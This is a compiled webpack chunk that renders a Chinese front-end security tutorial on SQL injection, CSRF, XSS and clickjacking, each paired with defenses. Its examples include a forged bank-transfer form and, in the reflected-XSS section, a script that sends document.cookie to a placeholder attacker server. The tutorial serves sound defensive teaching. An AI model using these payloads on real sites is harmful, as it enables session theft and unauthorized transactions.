(window.webpackJsonp=window.webpackJsonp||[]).push([[58],{273:function(t,e,r){"use strict";r.r(e);var a=r(6),n=Object(a.a)({},(function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[r("h2",{attrs:{id:"前端安全"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#前端安全"}},[t._v("#")]),t._v(" 前端安全")]),t._v(" "),r("blockquote",[r("p",[t._v("在繁忙的日常工作中能完成工作就不错了,还安全?\n你看银行安全吗?要不...嘿嘿...")])]),t._v(" "),r("p",[t._v("先说一个亲身经历的故事：比如我们做微信公众号的时候，为了刺激增加用户经常要给新用户发一些\n红包，不管是几毛还是1块注册一下就能 收到，何乐而不为呢？但是这个时候比如：发给用户的金额是\n1元-2元之间"),r("br"),t._v(" "),r("code",[t._v("Math.round(((Math.random()*10)+10))/10")]),r("br"),t._v("\n假设这时候这个金额是前端生成 传给后端的，后端根据我们传的值从而决定给你用户发放\n红包你说安全嘛？ 有些人要是不用你生成的随机数呢？人家要是手动修改呢？传个200你说发不发？\n当然你会说，那这是后台的问题了，是的你说的没错 主要责任在于后端，可再普通的小公司你身为前端工程师\n你就不管了嘛？肯定是不行的。我算是亲眼目睹了3个同事被扣1500大洋的，因为当时损失了5000多。"),r("br"),t._v("\n我们还是需要了解很多安全知识的,现在什么最值钱？"),r("br"),t._v("\n我说数据排在第一位，相信大家也都能理解吧！"),r("br")]),t._v(" "),r("h2",{attrs:{id:"_1-0-sql注入"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#_1-0-sql注入"}},[t._v("#")]),t._v(" 1.0 SQL注入")]),t._v(" "),r("p",[t._v("SQL注入出现的原因是开发人员过于信任从前端输入的数据，没有经过校验就直接插入到SQL语句中执行，导致执行了开发人员预料之外的SQL语句，从而对Web应用乃至整个服务器造成危害。")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('比如用户登录 \n前端发了一个请求："https://www.baidu.com/s?username=`${username}`&password=`${password}`"\n我们自己写的请求很完美吧！就写这个请求脑细胞死了一大堆，赶快下楼抽根烟休息一下\n\n假设后端 是这样查找数据的\n$sql = "select * from User where username = \'" . $username . "\' and password = \'" . $password . "\'";\n后端写的也很完美 没毛病，正常输入 用户名密码 查到相关数据 解决下班走人了，\n\n可要有这么一个人写了用户名是1=1 \n我们的查询语句就变成 select * from User where username = 1=1 \n这我们的查询就变成了 查看所有的用户信息了，可怕不，\n这就是sql注入漏洞 具体很多 我不赘述\n')])])]),r("p",[r("strong",[t._v("防止sql注入")]),r("br"),t._v("\n预编译语句是已经准备好了SQL语句，在执行阶段只是把输入的数据作为字符串处理，而不再对SQL语句进行解析，因此避免了SQL注入问题")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("$sql = \"select * from User where username = ? and password = ?\";\n//预编译语句\n$stmt = $conn->prepare($sql);\n//定义要传入的变量（可以接收传过来的值）\n$username='admin';\n$password ='123456'\n//将变量绑定到占位初\n$stmt ->bindParam(1,$username);\n$stmt ->bindParam(2,$password);\n这样就ok了\n")])])]),r("h2",{attrs:{id:"_2-0-csrf-跨站请求伪造-攻击是什么"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#_2-0-csrf-跨站请求伪造-攻击是什么"}},[t._v("#")]),t._v(" 2.0 CSRF(跨站请求伪造) 攻击是什么")]),t._v(" "),r("blockquote",[r("p",[t._v("Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。")])]),t._v(" "),r("p",[r("strong",[t._v("CSRF 攻击原理")]),r("br")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("1.0 登录网站A，并在本地生成了Cookie\n2.0 你没关闭A，这时候你打开了网站B\n3.0 B网站发送了一些攻击A网站的代码\n4.0 但是服务器不知道 这是B网站发出的，因为你的cookie信息是正确的\n")])])]),r("p",[t._v("再具体一点")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('1.0 你登录了 A银行 并向你好友转账 请求是：\nhttp://bank.example/withdraw?account=bob&amount=100&for=bob2\n2.0 这时候你又登录了B网站 人家知道了这个请求 并给你一个很诱人的按钮点我送你 500块 \n<form action="http://bank.example/withdraw?account=bob&amount=100&for=xiaoMing" method="get">\n  ...\n</form>\n3.0 这时候你一点击 cookie正确 ok钱转到xiaoMing了 银行那边说是你正常发出的转账啊！\n    钱已到小明账户了，人家那不随便花吗\n')])])]),r("p",[r("strong",[t._v("怎么预防呢？")]),r("br"),t._v("\n1.0 设置cookie sameSite 属性："),r("br")]),t._v(" "),r("blockquote",[r("p",[t._v("1.1 strict "),r("br"),t._v(" "),r("code",[t._v("最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。")]),r("br"),t._v("\n1.2 Lax"),r("br"),t._v(" "),r("code",[t._v("Lax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。")]),r("br"),t._v("\n1.3 none"),r("br"),t._v(" "),r("code",[t._v("Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。")]),r("br")])]),t._v(" "),r("p",[t._v("2.0 在发送的请求里面 加一个随机验证码"),r("br")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('2.1 A网站页面 \n<form action="http://bank.example/withdraw?account=bob&amount=100&for=bob2" method="get">\n  <input type="hidden" name="token" value="dad3weg34">\n  ...\n</form>\n2.2 也可以发送请求之前先向服务器发送验证码 验证码合法后再进一步请求\n2.3 先验证token也是可以的\n')])])]),r("p",[t._v("3.0 服务端设置 http的Referer(不太安全的防御)")]),t._v(" "),r("blockquote",[r("p",[t._v("Referer是HTTP请求Header的一部分，当浏览器向Web服务器发送请求的时候，请求头信息一般需要包含Referer。该Referer会告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。")])]),t._v(" "),r("p",[t._v("这时候上面例子B网站发出的 请求就会被拦截掉，但是这种做法就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。")]),t._v(" "),r("h2",{attrs:{id:"_3-0-xss-跨站脚本攻击"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#_3-0-xss-跨站脚本攻击"}},[t._v("#")]),t._v(" 3.0 XSS 跨站脚本攻击")]),t._v(" "),r("p",[t._v("xss: 跨站脚本攻击（Cross Site Scripting，本来缩写是CSS，为了和层叠样式的CSS有所区别，所以在安全领域叫“XSS”。）是最常见和基本的攻击 WEB 网站方法。")]),t._v(" "),r("blockquote",[r("p",[t._v("XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。")])]),t._v(" "),r("p",[r("strong",[t._v("1.0 DOM XSS :")]),r("br"),t._v("\nDOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。\n"),r("br"),t._v("\n实际上就是前端 js 代码把不可信的内容插入到了页面。在使用 .innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为 HTML 插到页面上，尽量使用 .innerText、.textContent、.setAttribute() 等。")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("//HTML节点内容注入\n<div><script>alert(1);<\/script></div>  \n\n//DOM属性注入\n<img src='/images/1.png' onerror='alert(1);'>  \n\n//javascript代码\n<script>\n    var a = '1';alert(1);''\n<\/script>\n\n//富文本是html标签，文字，以及样式的集合，很容易实现HTML节点内容注入和DOM属性注入，有被攻击的风险\n比如这段代码就会让 浏览器有弹窗\n`document.write('<script>alert(1)</'+'script>')`\n上面这句话啊假设是用户恶意输入的我们就对其进行转义然后是这样的\ndocument.write('&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;&#x2F;script&gt')\n")])])]),r("p",[r("strong",[t._v("2、反射型 XSS :")]),r("br"),t._v("\n反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。也就是说，黑客往往需要引诱用户点击一个非法链接，才能攻击成功。")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("例如一个非法连接中可能存在这样一个script：\n<script>window.open('http://xx.xx.xx.xx:8080/ck.php?c='+document.cookie)<\/script>\n当执行这个非法链接后，即可将用户的cookie写入到xx.xx.xx.xx的服务器下的cookie.txt文件中。\n你的cookie 信息又丢失了\n")])])]),r("p",[r("strong",[t._v("3、存储型 XSS :")]),r("br"),t._v("\n存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。\n我们再留言板写入 "),r("code",[t._v("<script>alert(1)<\/script>")]),t._v(" 然后数据库保存了 ，我们前端再渲染的时候就会有弹窗。")]),t._v(" "),r("p",[r("strong",[t._v("XSS攻击防御")]),r("br"),t._v("\n1.0  对特定字符做转义：内容注入替换尖括号（ < => &lt;   > => &gt; ） 属性注入替换单引号或双引号（ \" => &quot;  ' => &#39; ）"),r("br"),t._v("\n2.0  设置httpOnly，浏览器将禁止页面的JS访问带有HttpOnly属性的Cookie。HttpOnly解决的是XSS后的Cookie劫持攻击。"),r("br"),t._v("\n3.0 浏览器自带防御机制，主要应对反射型攻击（HTML内容或属性）：http响应头中自动添加x-xss-protection，值为0（关闭），1（打开），默认打开"),r("br"),t._v("\n4.0 在服务端使用 HTTP的 Content-Security服务端设置 http的Referer-Policy 头部来指定策略，或者在前端设置 meta 标签。"),r("br")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("//我们可以在http响应头中设置Content-Security-Policy\n//图片可以从任何地方加载(注意 \"*\" 通配符)\n//多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)\n//可运行脚本仅允许来自于userscripts.example.com\nContent-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com\n\n//同时meta中也支持设置Content-Security-Policy\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\">\n")])])]),r("h2",{attrs:{id:"_4-0-点击劫持"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#_4-0-点击劫持"}},[t._v("#")]),t._v(" 4.0 点击劫持")]),t._v(" "),r("p",[t._v("第三方网站通过iframe内嵌某一个网站，并且将iframe设置为透明不可见，将其覆盖在其他经过伪装的DOM上，伪装的可点击DOM（按钮等）与实际内嵌网站的可点击DOM位置相同，\n当用户点击伪装的DOM时，实际上点击的是iframe中内嵌的网页的DOM从而触发请求操作。 通过用户点击完成了另一个操作，用户并不知情")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('<body style="background: url(clickhijack.png) no-repeat">\n    <iframe style="opacity:0" src="http://localhost:80/post/15" width="800" height="600"></iframe>    \n</body>\n')])])]),r("p",[r("strong",[t._v("点击劫持防御")]),r("br"),t._v("\n（1）Javascript禁止内嵌：当网页没有被使用iframe内嵌时，top和window是相等的；当网页被内嵌时，top和window是不相等的；可以在本网站的页面中添加如下判断：")]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v("<script>\nif (top.location != window.location) {\n    //如果不相等，说明使用了iframe，可进行相关的操作\n}\n<\/script>\n")])])]),r("p",[t._v("假设网页禁用了JS，此时点击劫持还是会有的。"),r("br"),t._v("\n（2）设置http响应头 X-Frame-Options：有三个值 DENY（禁止内嵌） SAMEORIGIN（只允许同域名页面内嵌） ALLOW-FROM（指定可以内嵌的地址）"),r("br")]),t._v(" "),r("blockquote",[r("p",[t._v("能在所有的web服务器端预设好X-Frame-Options字段值是最理想的状态")])]),t._v(" "),r("p",[t._v("这个其实是开发者在自己网站上 放的这些恶意跳转，比如你们也经常遇到的，你想去网站上看一些视频，第一次你不管点击了那里都会跳转到其他网站。原理是一样的，不过不一定用了iframe，\n不过现在js前端我们也是 不建议使用iframe的 所以这个漏洞放在了最后。我反正是没见过这个攻击。我们不能只讲以一些书面知识 得真遇见过才有说服力。\n"),r("a",{attrs:{href:"https://segmentfault.com/a/1190000016551188",target:"_blank",rel:"noopener noreferrer"}},[t._v("参考链接"),r("OutboundLink")],1)])])}),[],!1,null,null,null);e.default=n.exports}}]);